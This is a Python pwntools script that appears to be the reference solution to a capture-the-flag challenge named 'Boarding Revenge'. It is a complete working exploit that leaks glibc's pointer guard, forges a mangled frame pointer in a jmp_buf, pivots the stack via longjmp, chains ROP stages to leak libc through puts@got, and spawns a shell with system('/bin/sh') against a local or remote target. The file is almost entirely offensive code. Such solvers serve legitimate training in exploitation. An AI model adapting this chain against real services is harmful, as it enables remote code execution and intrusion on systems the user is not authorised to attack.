#!/usr/bin/env python3
# Boarding Revenge -- reference solver.
#
#   local :  ./solve.py            (runs ./boarding with ./libc.so.6 + ./ld here)
#   remote:  ./solve.py HOST PORT
#
# Technique: pointer-guard leak -> forge mangled rbp in the jmp_buf ->
#            longjmp + leave;ret stack pivot -> stage-1 read() into .bss ->
#            self-leak libc via puts(puts@got) -> system("/bin/sh").
# No libc pointer is handed to us; everything keys off fixed (non-PIE)
# binary addresses plus the one baggage_reclaim gadget.
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

BIN  = './boarding'
elf  = ELF(BIN)
libc = ELF('./libc.so.6')

pop3     = elf.symbols['baggage_reclaim']           # pop rdi; pop rsi; pop rdx; ret
pop_rbp  = next(elf.search(asm('pop rbp; ret')))
leave_ret= next(elf.search(asm('leave; ret')))
ret      = next(elf.search(asm('ret')))
plt_read = elf.plt['read']
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']

BP   = 0x13370000      # fixed mmap region (tiny: only the pivot chain lives here)
STG2 = 0x404500        # roomy .bss stack for stage 2
STG3 = 0x404900        # roomy .bss stack for stage 3

def mangle(value, guard):          # glibc PTR_MANGLE: rol(value ^ guard, 0x11)
    return rol(value ^ guard, 0x11, 64)

def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN)

io = start()

# ---- leak the pointer guard ----------------------------------------------
io.recvuntil(b'floor: 0x')
guard = int(io.recv(16), 16)
log.success('pointer guard = %#x', guard)
io.recvuntil(b'boarding pass data:')

# ---- stage 1: pivot (<= 80 bytes), read() a big stage-2 into .bss --------
# after longjmp + load_profile's leave;ret:  rsp=BP; pop rbp=[BP]; ret=[BP+8]
stage1 = flat({
    0x00: p64(0),             # eaten by `pop rbp` in the pivoting leave;ret
    0x08: p64(pop3),
    0x10: p64(0),             # rdi = stdin
    0x18: p64(STG2),          # rsi = dest
    0x20: p64(0x400),         # rdx = len
    0x28: p64(plt_read),      # read(0, STG2, 0x400)
    0x30: p64(pop_rbp),
    0x38: p64(STG2),
    0x40: p64(leave_ret),     # jmpbuf[0]/rbx slot -> pivots rsp into STG2
    0x48: p64(mangle(BP, guard)),   # jmpbuf[1] -> demangles to rbp = BP
}, filler=b'\x00', length=0x50)
io.send(stage1)

io.recvuntil(b'accepted.')
io.recvuntil(b'validating ticket...\n')

# ---- stage 2: self-leak libc, then read() stage 3 ------------------------
stage2 = flat({
    0x00: p64(0),
    0x08: p64(pop3),
    0x10: p64(got_puts), 0x18: p64(0), 0x20: p64(0),
    0x28: p64(plt_puts),      # puts(puts@got)  -> leak
    0x30: p64(pop3),
    0x38: p64(0), 0x40: p64(STG3), 0x48: p64(0x400),
    0x50: p64(plt_read),      # read(0, STG3, 0x400)
    0x58: p64(pop_rbp), 0x60: p64(STG3), 0x68: p64(leave_ret),
}, filler=b'\x00')
io.send(stage2.ljust(0x400, b'\x00'))

leak = io.recvline().strip()
leaked_puts = u64(leak[:6].ljust(8, b'\x00'))
if (leaked_puts & 0xfff) != (libc.symbols['puts'] & 0xfff):
    log.failure('leak truncated by a NUL byte -- just reconnect and retry')
    sys.exit(2)
libc.address = leaked_puts - libc.symbols['puts']
log.success('libc base = %#x', libc.address)

# ---- stage 3: system("/bin/sh") ------------------------------------------
stage3 = flat({
    0x00: p64(0),
    0x08: p64(ret),           # keep rsp 16-byte aligned before the call
    0x10: p64(pop3),
    0x18: p64(next(libc.search(b'/bin/sh\x00'))), 0x20: p64(0), 0x28: p64(0),
    0x30: p64(libc.symbols['system']),
}, filler=b'\x00')
io.send(stage3.ljust(0x100, b'\x00'))

io.sendline(b'id; cat /srv/app/flag.txt flag.txt 2>/dev/null')
io.interactive()
